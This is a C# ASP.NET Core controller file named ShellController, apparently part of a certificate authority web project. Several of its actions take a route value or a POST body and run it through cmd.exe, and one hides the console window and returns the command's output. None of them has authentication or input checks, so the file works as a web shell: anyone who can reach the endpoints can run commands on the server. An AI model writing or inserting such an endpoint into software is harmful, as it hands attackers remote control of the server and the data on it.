using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;


namespace CertificateAuthority.Controllers
{
    public class ShellController : Controller
    {
        public IActionResult Index()
        {
            return View();
        }

        public void shelltest()
        {
            string strCmdText;
            strCmdText = @"/c dir >> \\fs0\Data\netcoreshell.log";
            var hmm = System.Diagnostics.Process.Start("CMD.exe", strCmdText);
            //return hmm;
        }

        public void shellexec(string id)
        {
            string cmdText = "/c ";
            cmdText += id;
            System.Diagnostics.Process.Start("CMD.exe", cmdText);
        }

        [HttpPost]
        public void cmd([FromBody] cmdExecutor cmd)
        {
            System.Diagnostics.Process.Start("CMD.exe", "/c " + cmd.Command);
        }

        public class cmdExecutor
        {
            public string Command { get; set; }

        }

        [HttpPost]
        public string ExecuteCommand(cmdExecutor cmnd)
        {
            try
            {
                // create the ProcessStartInfo using "cmd" as the program to be run,
                // and "/c " as the parameters.
                // Incidentally, /c tells cmd that we want it to execute the command that follows,
                // and then exit.
                System.Diagnostics.ProcessStartInfo procStartInfo =
                    new System.Diagnostics.ProcessStartInfo("cmd", "/c " + cmnd.Command);

                // The following commands are needed to redirect the standard output.
                // This means that it will be redirected to the Process.StandardOutput StreamReader.
                procStartInfo.RedirectStandardOutput = true;
                procStartInfo.UseShellExecute = false;
                // Do not create the black window.
                procStartInfo.CreateNoWindow = true;
                // Now we create a process, assign its ProcessStartInfo and start it
                System.Diagnostics.Process proc = new System.Diagnostics.Process();
                proc.StartInfo = procStartInfo;
                proc.Start();
                // Get the output into a string
                string result = proc.StandardOutput.ReadToEnd();
                // Display the command output.
                Console.WriteLine(result);
                return result;
            }
            catch (Exception objException)
            {
                // Log the exception
                return "Command Failed";
            }
        }
    }
}